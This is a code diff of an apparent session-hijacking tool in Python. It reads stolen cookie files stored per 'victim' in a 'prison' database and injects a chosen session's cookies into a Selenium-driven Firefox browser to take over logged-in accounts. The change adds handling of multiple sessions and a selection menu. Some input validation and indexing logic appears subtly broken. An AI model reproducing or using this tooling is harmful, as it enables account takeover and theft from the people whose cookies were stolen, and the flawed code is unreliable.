@@ -9,8 +9,26 @@ from selenium import webdriver
 from webdriver_manager.firefox import GeckoDriverManager
 
 
+def load_selection_screen(sessions):
+    os.system("cls")
+    print(f"[i] {sessions} sessions detected.")
+    question = f"Which one to load? (1-{sessions}, s to skip) "
+    selection = input(question)
+    while (not is_int(selection) and selection not in range(1, sessions+1)) and selection != "s":
+        print("[-] Couldn't find that, try again")
+        selection = input(question)
+    return selection
+
+
 def load_cookies(victim, driver: webdriver.Firefox):
-    for domain in victim:
+    sessions = len(victim)
+    selection = 0
+    if sessions > 1:
+        selection = load_selection_screen(sessions)
+    if selection == "s":
+        print("[+] Skipping...")
+        return False
+    for domain in victim[selection]:
         for cookie in domain:
             cookie_obj = {
                 "name": cookie.name,
@@ -29,18 +47,21 @@ def get_cookies(prison, directory="data"):
         return False
     _, victims, _ = next(os.walk(directory))
     for victim in victims:
-        with open(f"{directory}/{victim}/cookies0.json") as f:
-            cookies = json.load(f)
-
-        cookie_list = []
-        for (domain, cookiejar) in cookies.items():
-            for cookie in cookiejar:
-                cookie_list.append(Cookie(
-                    cookie["name"], cookie["value"], cookie["domain"]))
-        cookie_jar = CookieJar(cookie_list)
         victim_obj = Victim(victim)
-        victim_obj.update_cookies(cookie_jar)
-        prison.add_victim(victim_obj)
+        _, _, cookie_files = next(os.walk(f"{directory}/{victim}"))
+        for cookie_file in cookie_files:
+            if "cookies" in cookie_file:
+                session_number = cookie_file[7:-5]
+                with open(f"{directory}/{victim}/{cookie_file}") as f:
+                    cookies = json.load(f)
+                cookie_list = []
+                for (_, cookiejar) in cookies.items():
+                    for cookie in cookiejar:
+                        cookie_list.append(Cookie(
+                            cookie["name"], cookie["value"], cookie["domain"]))
+                cookie_jar = CookieJar(cookie_list)
+                victim_obj.update_cookies(cookie_jar, session_number)
+                prison.add_victim(victim_obj)
     prison._save_db()
     print("[+] Database updated successfully...")
     return True
